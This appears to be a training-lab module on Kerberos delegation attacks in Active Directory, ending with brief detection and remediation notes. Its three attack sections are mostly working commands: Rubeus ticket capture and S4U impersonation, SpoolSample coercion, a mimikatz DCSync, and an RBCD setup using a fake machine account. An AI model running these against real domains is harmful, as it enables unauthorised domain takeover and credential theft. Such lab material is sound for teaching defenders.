# 04 — Kerberos Delegation Attacks

## Overview

Kerberos delegation allows a service to impersonate a user to authenticate to another service. Misconfigured delegation is one of the most powerful attack paths in Active Directory.

---

## Part 1: Unconstrained Delegation

### Lab Targets

| Account / Computer | Setting                      |
|--------------------|------------------------------|
| WEB-SRV-01         | TrustedForDelegation = True  |
| svc_web            | TrustedForDelegation = True  |

### How It Works

When a user authenticates to a service on an unconstrained delegation computer, their TGT is embedded in the TGS and forwarded. An attacker with local admin on that machine can extract TGTs.

### Attack

```powershell
# Enumerate unconstrained delegation targets
Get-DomainComputer -Unconstrained | Select-Object Name, dnshostname
Get-DomainUser -TrustedToAuth | Select-Object SamAccountName

# Monitor for incoming TGTs on WEB-SRV-01
.\Rubeus.exe monitor /interval:1 /filteruser:DC-01$

# Coerce DC-01 to authenticate to WEB-SRV-01 (Printer Bug / PetitPotam)
# From a separate machine or as a non-admin:
.\SpoolSample.exe DC-01.corp.local WEB-SRV-01.corp.local

# The TGT from DC-01$ will appear in Rubeus monitor output
# Copy the base64 ticket and inject it
.\Rubeus.exe ptt /ticket:<base64_TGT>

# Now run DCSync as DC-01$
.\mimikatz.exe "lsadump::dcsync /domain:corp.local /user:Administrator" exit
```

---

## Part 2: Constrained Delegation (KCD)

### Lab Target

`svc_iis` is configured with `msDS-AllowedToDelegateTo: CIFS/DC-01.corp.local`
and `TRUSTED_TO_AUTH_FOR_DELEGATION` (protocol transition enabled).

### Attack — S4U2Self + S4U2Proxy

```powershell
# Enumerate constrained delegation
Get-DomainUser -TrustedToAuth | Select-Object SamAccountName, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object Name, msds-allowedtodelegateto

# S4U attack with Rubeus
.\Rubeus.exe s4u `
  /user:svc_iis `
  /password:p@ssw0rd `
  /impersonateuser:Administrator `
  /msdsspn:"CIFS/DC-01.corp.local" `
  /nowrap `
  /ptt

# Verify access
ls \\DC-01.corp.local\C$
```

---

## Part 3: Resource-Based Constrained Delegation (RBCD)

### Lab Setup

`tariq.dev` has `WriteOwner` over `WEB-SRV-02`.
Machine Account Quota allows attacker to create a computer account.

### Attack

```powershell
# Step 1 — Take ownership of WEB-SRV-02 using tariq.dev
$TariqCred = New-Object PSCredential("corp\tariq.dev", (ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force))
Set-DomainObjectOwner -Identity WEB-SRV-02 -OwnerIdentity tariq.dev -Credential $TariqCred

# Step 2 — Add GenericAll to tariq.dev over WEB-SRV-02
Add-DomainObjectAcl -TargetIdentity WEB-SRV-02 -PrincipalIdentity tariq.dev -Rights All -Credential $TariqCred

# Step 3 — Create a fake computer account (uses MAQ = 10)
$FakePass = ConvertTo-SecureString "FakePass123!" -AsPlainText -Force
New-MachineAccount -MachineAccount "FAKE-PC" -Password $FakePass -Credential $TariqCred

# Step 4 — Set msDS-AllowedToActOnBehalfOfOtherIdentity on WEB-SRV-02
$FakeSid = (Get-DomainComputer "FAKE-PC").objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$FakeSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Set-DomainObject -Identity WEB-SRV-02 -Set @{'msds-allowedtoactonbehalfofotheridentity' = $SDBytes} -Credential $TariqCred

# Step 5 — S4U attack as FAKE-PC$ to impersonate Administrator on WEB-SRV-02
.\Rubeus.exe s4u `
  /user:FAKE-PC$ `
  /password:FakePass123! `
  /impersonateuser:Administrator `
  /msdsspn:"CIFS/WEB-SRV-02.corp.local" `
  /nowrap `
  /ptt

ls \\WEB-SRV-02.corp.local\C$
```

---

## Detection

- Unconstrained Delegation: Event 4624 with logon type 3 from unusual source
- Constrained Delegation: Event 4769 with S4U service ticket requests
- RBCD: Changes to `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute (Event 4742 / 5136)

## Remediation

- Avoid unconstrained delegation; use constrained or RBCD instead
- Require ticket protection (Protected Users security group) for privileged accounts
- Monitor `msDS-AllowedToActOnBehalfOfOtherIdentity` changes
- Set Machine Account Quota to 0 (`ms-DS-MachineAccountQuota`)
